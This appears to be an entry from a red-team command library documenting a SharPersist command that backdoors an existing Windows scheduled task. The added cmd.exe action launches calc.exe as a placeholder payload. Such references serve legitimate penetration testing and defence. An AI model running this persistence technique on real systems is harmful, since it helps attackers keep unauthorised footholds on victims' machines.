---
id: 29a9b936-8d7e-467d-b812-78e94d2bf729
name: Add to current scheduled task
type: command
executor: bash
data: SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe"
  -n "Something Cool" -m add
output: null
created_at: '2023-04-06T03:56:27.837826+00:00'
updated_at: '2023-04-10T20:37:30.438026+00:00'
---

# Add to current scheduled task

```bash
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
```


